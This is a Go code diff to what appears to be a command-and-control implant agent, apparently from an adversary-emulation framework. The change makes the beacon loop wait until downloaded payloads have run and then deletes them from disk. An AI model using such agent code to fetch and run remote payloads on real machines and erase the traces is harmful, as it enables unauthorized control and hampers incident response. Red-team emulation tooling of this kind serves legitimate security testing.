@@ -12,6 +12,7 @@ import (
 	"runtime"
 	"strings"
 	"time"
+	"sync"
 
 	"../contact"
 	"../proxy"
@@ -40,6 +41,22 @@ func downloadPayloads(payloadListStr string, coms contact.Contact, profile map[s
 	return droppedPayloads
 }
 
+
+func cleanupPayloads(droppedPayloads []string, wg *sync.WaitGroup) {
+	// wait until we are signalled that all the previous instructions have completed
+	// before attempting to remove any payloads that were downloaded.
+	(*wg).Wait()
+	for i := 0; i < len(droppedPayloads); i++ {
+		payloadPath := droppedPayloads[i]
+		output.VerbosePrint(fmt.Sprintf("[*] cleaning up payload: %s", payloadPath))
+		err := os.Remove(payloadPath)
+
+		if err != nil {
+			output.VerbosePrint(fmt.Sprintf("[-] %s not found. Skipping.", payloadPath))
+		}
+	}
+}
+
 func runAgent(coms contact.Contact, profile map[string]interface{}) {
 	watchdog := 0
 	checkin := time.Now()
@@ -51,14 +68,25 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 		}
 		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
 			cmds := reflect.ValueOf(beacon["instructions"])
+
+			// create a synchronization construct that won't let us delete payloads
+			// until all the instructions have finished running
+			var wg sync.WaitGroup
+			wg.Add(cmds.Len())
+			var allPayloads []string
 			for i := 0; i < cmds.Len(); i++ {
 				cmd := cmds.Index(i).Elem().String()
 				command := util.Unpack([]byte(cmd))
 				output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", command["id"]))
 				droppedPayloads := downloadPayloads(command["payload"].(string), coms, profile)
-				go coms.RunInstruction(command, profile, droppedPayloads)
+				// capture all the payloads that have been dropped for later removal
+				allPayloads = append(allPayloads, droppedPayloads...)
+				go coms.RunInstruction(command, profile, droppedPayloads, &wg)
 				util.Sleep(command["sleep"].(float64))
 			}
+
+			go cleanupPayloads(allPayloads, &wg)
+
 		} else {
 			if len(beacon) > 0 {
 				util.Sleep(float64(beacon["sleep"].(int)))
